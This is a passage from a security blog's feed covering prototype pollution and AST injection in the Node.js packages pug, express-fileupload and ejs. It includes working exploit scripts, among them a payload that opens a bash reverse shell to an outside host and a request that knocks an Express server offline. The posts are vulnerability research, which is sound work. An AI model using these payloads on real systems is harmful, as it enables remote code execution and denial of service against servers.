:</span></span><br><span class="line"><span class="comment">            typeof msg !== &#x27;undefined&#x27; ? msg : undefined, &quot;process&quot; in locals_for_with ?</span></span><br><span class="line"><span class="comment">            locals_for_with.process :</span></span><br><span class="line"><span class="comment">            typeof process !== &#x27;undefined&#x27; ? process : undefined));;</span></span><br><span class="line"><span class="comment">    &#125; catch (err) &#123;</span></span><br><span class="line"><span class="comment">        pug.rethrow(err, pug_debug_filename, pug_debug_line);</span></span><br><span class="line"><span class="comment">    &#125;;</span></span><br><span class="line"><span class="comment">    return pug_html;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>Example of a generated function.<br>You can see that the <code>Object.prototype.line</code> value is inserted in the right-hand side of the <code>pug_debug_line</code> definition.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">block</span> = &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;Text&quot;</span>, <span class="string">&quot;line&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`h1= msg`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn = pug.<span class="title function_">compile</span>(source);</span><br><span class="line"><span class="keyword">var</span> html = <span class="title function_">fn</span>(&#123;<span class="attr">msg</span>: <span class="string">&#x27;It works&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(html); <span class="comment">// &quot;uid=0(root) gid=0(root) groups=0(root)\n\n&lt;h1&gt;It worksndefine&lt;/h1&gt;&quot;</span></span><br></pre></td></tr></table></figure><p>As a result, an attack can be configured like this.<br>By specifying a string in the <code>node.line</code> value, which is always defined as number through parser.<br>So, any command could be inserted into the function.</p><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; unflatten &#125; = <span class="built_in">require</span>(<span class="string">&#x27;flat&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(<span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> template = pug.<span class="title function_">compile</span>(<span class="string">`h1= msg`</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="title function_">template</span>(&#123;<span class="attr">msg</span>: <span class="string">&#x27;It works&#x27;</span>&#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/vulnerable&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> object = <span class="title function_">unflatten</span>(req.<span class="property">body</span>);</span><br><span class="line">    res.<span class="title function_">json</span>(object);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>As in the example of handlebars, flat used to configure the server.<br>The template engine has been changed to <code>pug</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">TARGET_URL = <span class="string">&#x27;http://p6.is:3000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make pollution</span></span><br><span class="line">requests.post(TARGET_URL + <span class="string">&#x27;/vulnerable&#x27;</span>, json = &#123;</span><br><span class="line">    <span class="string">&quot;__proto__.block&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Text&quot;</span>, </span><br><span class="line">        <span class="string">&quot;line&quot;</span>: <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(`bash -c &#x27;bash -i &gt;&amp; /dev/tcp/p6.is/3333 0&gt;&amp;1&#x27;`)&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute</span></span><br><span class="line">requests.get(TARGET_URL)</span><br></pre></td></tr></table></figure><p><img src="/img/2020/08/pic_2.png" alt="img"></p><p>We can insert any code into the <code>block.line</code>, and get a shell.</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>I described how to make arbitrary command execution,<br>through AST Injection on the JS template engines.</p><p>In fact, these parts are very hard to fix completely<br>So I expect this to remain like EJS.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;This article describes how to trigger RCE&lt;br&gt;in two well-known template engines,&lt;br&gt;using a new technique called AST Injecti
      
    
    </summary>
    
    
      <category term="Docs" scheme="https://blog.p6.is/category/docs/"/>
    
    
  </entry>
  
  <entry>
    <title>Real-world JS - 1</title>
    <link href="https://blog.p6.is/Real-World-JS-1/"/>
    <id>https://blog.p6.is/Real-World-JS-1/</id>
    <published>2020-07-29T02:29:02.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Real-world-JS-1"><a href="#Real-world-JS-1" class="headerlink" title="Real-world JS 1"></a>Real-world JS 1</h1><blockquote><p>Real-world JS Vulnerabilities Series 1</p></blockquote><h2 id="express-fileupload"><a href="#express-fileupload" class="headerlink" title="express-fileupload"></a>express-fileupload</h2><p>JavaScript Vulnerabilities (prototype pollution, redos, type confusion etc) is a popular topic in recent security competition such as CTFs<br>But, there seems to be a lack of real-world research for them, so I started research to find it and share data.</p><p>This research aims to improve the nodejs ecosystem security level.</p><p><img src="/img/2020/07/image-20200729093633030.png" alt="image-20200729093633030"></p><p>This vulnerability is in the first case about the <code>express-fileupload</code>.<br>As shown in the name, this module provide file upload function as <code>express middleware</code></p><p><img src="/img/2020/07/image-20200729093731270.png" alt="image-20200729093731270"></p><p>Until today, this <code>express-fileupload</code> has been downloaded a total of <code>7,193,433</code> times.</p><p><img src="/img/2020/07/image-20200729094135815.png" alt="image-20200729094135815"></p><p>The <code>express-fileupload</code> module provides several options for uploading and managing files in the nodejs application.<br>Among them, the <code>parseNested</code> make argument flatten.</p><p>Therefore, if we provide <code>&#123;&quot;a.b.c&quot;: true&#125;</code> as an input,<br>Internally, It will used as <code>&#123;&quot;a&quot;: &#123;&quot;b&quot;: &#123;&quot;c&quot;: true&#125;&#125;&#125;</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">busboy.<span class="title function_">on</span>(<span class="string">&#x27;finish&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">debugLog</span>(options, <span class="string">`Busboy finished parsing request.`</span>);</span><br><span class="line">    <span class="keyword">if</span> (options.<span class="property">parseNested</span>) &#123;</span><br><span class="line">        req.<span class="property">body</span> = <span class="title function_">processNested</span>(req.<span class="property">body</span>);</span><br><span class="line">        req.<span class="property">files</span> = <span class="title function_">processNested</span>(req.<span class="property">files</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!req[waitFlushProperty]) <span class="keyword">return</span> <span class="title function_">next</span>();</span><br><span class="line">    <span class="title class_">Promise</span>.<span class="title function_">all</span>(req[waitFlushProperty])</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">delete</span> req[waitFlushProperty];</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">delete</span> req[waitFlushProperty];</span><br><span class="line">        <span class="title function_">debugLog</span>(options, <span class="string">`Error while waiting files flush: <span class="subst">$&#123;err&#125;</span>`</span>);</span><br><span class="line">        <span class="title function_">next</span>(err);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>So, if <code>options.parseNested</code> has a value. If calls <code>processNested</code> Function, and argument will be <code>req.body</code> and <code>req.files</code>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">processNested</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!data || data.<span class="property">length</span> &lt; <span class="number">1</span>) <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> d = &#123;&#125;,</span><br><span class="line">        keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; keys.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> key = keys[i],</span><br><span class="line">            value = data[key],</span><br><span class="line">            current = d,</span><br><span class="line">            keyParts = key</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="regexp">/\[/g</span>), <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="regexp">/\]/g</span>), <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        .<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; keyParts.<span class="property">length</span>; index++)&#123;</span><br><span class="line">            <span class="keyword">let</span> k = keyParts[index];</span><br><span class="line">            <span class="keyword">if</span> (index &gt;= keyParts.<span class="property">length</span> - <span class="number">1</span>)&#123;</span><br><span class="line">                current[k] = value;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!current[k]) current[k] = !<span class="built_in">isNaN</span>(keyParts[index + <span class="number">1</span>]) ? [] : &#123;&#125;;</span><br><span class="line">                current = current[k];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>The above is the full source of the <code>processNested</code> function.<br>Here provides <code>flatten</code> function for key, of <code>req.files</code>.</p><p>It split the key value of the first argument of object obtained through <code>Object.keys(data)</code> by <code>.</code><br>and makes loop using that, and refers&#x2F;define object repeatedly.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> some_obj = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">`&#123;&quot;__proto__.polluted&quot;: true&#125;`</span>);</span><br><span class="line"><span class="title function_">processNested</span>(some_obj);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(polluted); <span class="comment">// true!</span></span><br></pre></td></tr></table></figure><p>In this function, prototype pollution vulnerability is caused by the above usage.<br>Therefore, if we can put manufactured objects in this function, it can affect the express web application.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileUpload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">fileUpload</span>(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;express-fileupload poc&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">7777</span>)</span><br></pre></td></tr></table></figure><p>Therefore, configure and run the express server using <code>express-fileupload</code> in the above form.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> / <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data; boundary=--------<span class="number">1566035451</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">123</span></span><br><span class="line"></span><br><span class="line">----------<span class="number">1566035451</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;name&quot;</span>; filename=<span class="string">&quot;filename&quot;</span></span><br><span class="line"></span><br><span class="line">content</span><br><span class="line">----------<span class="number">1566035451</span>--</span><br></pre></td></tr></table></figure><p>And I send the above <code>POST</code> request.</p><p><img src="/img/2020/07/image-20200729100022061.png" alt="image-20200729100022061"></p><p>Then we can confirm that the some object is given as the argument of <code>processNested</code> function. (I added code for debug)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> / <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data; boundary=--------<span class="number">1566035451</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">137</span></span><br><span class="line"></span><br><span class="line">----------<span class="number">1566035451</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;__proto__.toString&quot;</span>; filename=<span class="string">&quot;filename&quot;</span></span><br><span class="line"></span><br><span class="line">content</span><br><span class="line">----------<span class="number">1566035451</span>--</span><br></pre></td></tr></table></figure><p>Let’s try <code>prototype pollution</code><br>If we send this with the name changed to <code>__proto__.toString</code>.</p><p><img src="/img/2020/07/image-20200729100528922.png" alt="image-20200729100528922"></p><p>An object with the key <code>__proto__.toString</code> is created and call processNested function.<br>and pollute <code>toString</code> method of <code>Object.prototype</code>.<br>And from the moment this value is covered with a object that is not a function.<br>The <code>express</code> application makes error for every request !</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isRegExp = <span class="keyword">function</span> <span class="title function_">isRegExp</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(obj) === <span class="string">&#x27;[object RegExp]&#x27;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>In the <code>qs</code> module used within the <code>express</code>, <code>location.search</code> part of the HTTP request will be parsed and make it to <code>req.query</code> object.<br>In that logic, <code>qs</code> uses <code>Object.prototype.toString</code>.<br>Therefore, this function called for every request in the express application (even if there is no search part)<br>If <code>Object.prototype.toString</code> can be polluted, this will cause an error.<br>and for every request, express always returns 500 error.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;http://p6.is:7777&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.toString&#x27;</span>: <span class="string">&#x27;express-fileupload poc&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure><p>Actually, if we use script above to pollute the prototype of <code>server</code></p><p><img src="/img/2020/07/image-20200729101543292.png" alt="image-20200729101543292"></p><p>For all requests, the server returns either these error messages (development mode)<br>or only a blank screen and <code>500 Internal Server Error</code>! 😮</p><h2 id="How-to-get-shell"><a href="#How-to-get-shell" class="headerlink" title="How to get shell?"></a>How to get shell?</h2><p>We can already make a DOS, but everyone wants a shell.<br>So, I’ll describe one way to acquire shell through the vulnerability above.</p><p><img src="/img/2020/07/image-20200729102550071.png" alt="image-20200729102550071"></p><p>The simplest way to obtain shell through <code>prototype solution</code> in the express application is by using the <code>ejs</code>.<br>Yes, There is a limitation to whether the application should be using the <code>ejs template engine</code></p><p><img src="/img/2020/07/image-20200729102347702.png" alt="image-20200729102347702"></p><p>But the EJS is the most popular template engine for the nodejs<br>and also used very often in combination with the express.</p><p>If this vulnerability exists, you can bet on this. (no guaranteed 😏)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileUpload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">fileUpload</span>(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">polluted</span>);</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index.ejs&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">7777</span>);</span><br></pre></td></tr></table></figure><p>The above is an example of using the ejs module.<br>There was only one line change in replacing the rendering engine.</p><p>Because the parseNested option is still active, we can still pollute prototype.<br>Unlike the above here, I will use <code>req.body</code> object.</p><p>Because we can manipulated the value of that as string.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Type: multipart/form-data; boundary=--------1566035451</span><br><span class="line">Content-Length: 137</span><br><span class="line"></span><br><span class="line">----------1566035451</span><br><span class="line">Content-Disposition: form-data; name=&quot;__proto__.polluted&quot;;</span><br><span class="line"></span><br><span class="line">content</span><br><span class="line">----------1566035451--</span><br></pre></td></tr></table></figure><p>Similar with above, but the <code>filename</code>of <code>Content-Disposition</code> has been deleted.<br>Then the value will go to <code>req.body</code> not <code>req.files</code>.</p><p><img src="/img/2020/07/image-20200729103038537.png" alt="image-20200729103038537"><img src="/img/2020/07/image-20200729103132948.png" alt="image-20200729103132948"></p><p>By checking the values that enter the <code>processNested</code> function<br>You can see that the values that were previously objects is now string.</p><p>pollution happens the same as before.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Template</span>(<span class="params">text, opts</span>) &#123;</span><br><span class="line">  opts = opts || &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> options = &#123;&#125;;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">templateText</span> = text;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type</span> &#123;<span class="type">string | null</span>&#125; */</span></span><br><span class="line">  ...</span><br><span class="line">  options.<span class="property">outputFunctionName</span> = opts.<span class="property">outputFunctionName</span>;</span><br><span class="line">  options.<span class="property">localsName</span> = opts.<span class="property">localsName</span> || <span class="built_in">exports</span>.<span class="property">localsName</span> || _DEFAULT_LOCALS_NAME;</span><br><span class="line">  options.<span class="property">views</span> = opts.<span class="property">views</span>;</span><br><span class="line">  options.<span class="property">async</span> = opts.<span class="property">async</span>;</span><br></pre></td></tr></table></figure><p>The target value to pollute is the <code>outputFunctionName</code>, which is an option in the ejs rendering function.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">compile</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type</span> &#123;<span class="type">string</span>&#125; */</span></span><br><span class="line">  <span class="keyword">var</span> src;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type</span> &#123;<span class="type">ClientFunction</span>&#125; */</span></span><br><span class="line">  <span class="keyword">var</span> fn;</span><br><span class="line">  <span class="keyword">var</span> opts = <span class="variable language_">this</span>.<span class="property">opts</span>;</span><br><span class="line">  <span class="keyword">var</span> prepended = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> appended = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type</span> &#123;<span class="type">EscapeCallback</span>&#125; */</span></span><br><span class="line">  <span class="keyword">var</span> escapeFn = opts.<span class="property">escapeFunction</span>;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type</span> &#123;<span class="type">FunctionConstructor</span>&#125; */</span></span><br><span class="line">  <span class="keyword">var</span> ctor;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">source</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">generateSource</span>();</span><br><span class="line">    prepended +=</span><br><span class="line">      <span class="string">&#x27;  var __output = &quot;&quot;;\n&#x27;</span> +</span><br><span class="line">      <span class="string">&#x27;  function __append(s) &#123; if (s !== undefined &amp;&amp; s !== null) __output += s &#125;\n&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (opts.<span class="property">outputFunctionName</span>) &#123;</span><br><span class="line">      prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (opts.<span class="property">destructuredLocals</span> &amp;&amp; opts.<span class="property">destructuredLocals</span>.<span class="property">length</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> destructuring = <span class="string">&#x27;  var __locals = (&#x27;</span> + opts.<span class="property">localsName</span> + <span class="string">&#x27; || &#123;&#125;),\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; opts.<span class="property">destructuredLocals</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> name = opts.<span class="property">destructuredLocals</span>[i];</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          destructuring += <span class="string">&#x27;,\n  &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        destructuring += name + <span class="string">&#x27; = __locals.&#x27;</span> + name;</span><br><span class="line">      &#125;</span><br><span class="line">      prepended += destructuring + <span class="string">&#x27;;\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (opts.<span class="property">_with</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">      prepended +=  <span class="string">&#x27;  with (&#x27;</span> + opts.<span class="property">localsName</span> + <span class="string">&#x27; || &#123;&#125;) &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      appended += <span class="string">&#x27;  &#125;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    appended += <span class="string">&#x27;  return __output;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">source</span> = prepended + <span class="variable language_">this</span>.<span class="property">source</span> + appended;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>The ejs makes Function for implement their template and executing<br>and the <code>outputFunctionName</code> option used in the process is included in the function.</p><p>Therefore, if we can manipulate this value, any command can be executed.</p><p>This technique was introduced by a Chinese CTF in 2019.<br>Please refer to <a href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs">here</a> for details.</p><p>That part has not been patched so far, and it is expected to remain in the future.<br>So we can take advantage of it.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> / <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data; boundary=--------<span class="number">1566035451</span></span><br><span 